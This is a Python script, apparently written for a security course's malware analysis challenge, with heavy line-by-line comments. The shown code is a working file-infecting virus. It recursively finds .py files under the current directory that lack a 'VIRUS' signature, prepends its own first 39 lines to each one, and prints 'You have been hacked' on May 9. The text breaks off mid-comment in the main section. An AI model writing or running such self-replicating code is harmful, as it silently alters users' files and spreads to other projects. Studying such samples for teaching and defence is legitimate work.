#!/usr/bin/env python3

#Script:                       Ops 301 Ops Chall 14
# Author:                       carlos rojas 
# Date of latest revision:      06/16/2023
# Purpose:                      Python Malware Analysis



import os           # The 'os' module provides a way of using operating system-dependent functionality.
import datetime      # The 'datetime' module supplies classes for working with dates and times.

SIGNATURE = "VIRUS"


def locate(path):
    # Function to locate files in the given path that are potentially infected by the virus.
    # It takes a 'path' parameter specifying the directory to search in.
    # Returns a list of paths to potentially infected files.

    files_targeted = []  # List to store the paths of potentially infected files.
    filelist = os.listdir(path)  # Returns a list of files and directories in the given 'path'.

    # Iterating through each file/directory in the 'filelist'.
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If the current item is a directory, recursively call 'locate' function
            # to search for infected files inside that directory.
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # If the file ends with ".py" (Python source file), check if it is infected by the virus.
            infected = False
            for line in open(path+"/"+fname):
                # Open the file and iterate over each line.
                if SIGNATURE in line:
                    # If the virus signature is found in the line, the file is considered infected.
                    infected = True
                    break
            if infected == False:
                # If the file is not infected, add its path to the list of targeted files.
                files_targeted.append(path+"/"+fname)

    return files_targeted

def infect(files_targeted):
    # Function to infect files in the given list with the virus.
    # It takes a 'files_targeted' parameter, which is a list of paths to potentially infected files.

    virus = open(os.path.abspath(__file__))
    # Open the current script file using the 'open' function and get a file object.
    # 'os.path.abspath(__file__)' returns the absolute path of the current script file.

    virusstring = ""
    for i, line in enumerate(virus):
        # Iterate over each line in the virus file.
        if 0 <= i < 39:
            # Copy the first 39 lines of the virus file.
            virusstring += line
    virus.close
    # Close the virus file.

    for fname in files_targeted:
        f = open(fname)
        # Open each targeted file in the list for reading.
        temp = f.read()
        f.close()
        # Read the contents of the targeted file and close it.

        f = open(fname, "w")
        # Reopen the targeted file in write mode to overwrite its contents.

        f.write(virusstring + temp)
        # Write the virus code (stored in 'virusstring') followed by the original contents of the targeted file.

        f.close()
        # Close the targeted file after writing.

def detonate():
    # Function to check if the current date is May 9th and print a message if it is.

    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# --- Main Execution ---
# The following lines of code are the main execution of the script.

files_targeted = locate(os.path.abspath(""))
# Call the 'locate' function with the absolute path of the current directory ('""' represents the current directory).
# The returned list of targeted files is stored in the 'files



